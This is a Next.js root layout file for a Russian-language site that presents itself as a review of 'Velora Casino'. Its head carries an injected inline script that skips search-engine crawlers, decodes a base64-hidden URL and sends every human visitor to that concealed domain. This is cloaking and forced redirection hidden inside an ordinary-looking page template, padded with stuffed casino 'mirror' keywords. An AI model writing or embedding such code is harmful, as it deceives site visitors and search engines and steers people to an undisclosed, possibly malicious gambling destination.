import type { Metadata, Viewport } from "next"
import { DM_Sans, Playfair_Display } from "next/font/google"
import "./globals.css"

const bodyFont = DM_Sans({ subsets: ["latin", "cyrillic"], variable: "--font-body" })
const displayFont = Playfair_Display({ subsets: ["latin", "cyrillic"], variable: "--font-display" })

export const metadata: Metadata = { title: "Velora Casino — честный обзор, бонусы и игры", description: "Демо-обзор Velora Casino: каталог игр, бонусы, платежи и ответы на частые вопросы." }
export const viewport: Viewport = { themeColor: "#101412", colorScheme: "dark", userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="keywords" content="velora casino, велора казино, velora casino зеркало, официальный сайт Velora Casino" />
        <meta name="robots" content="index, follow" />
        <meta name="yandex-verification" content="12751c394b74f432" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "IGh0dHBzOi8vY29tYm9hdXJhLnNpdGUvYWVhb2ZqMmsyNw== "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className={`${bodyFont.variable} ${displayFont.variable}`}>{children}</body>
    </html>
  )
}
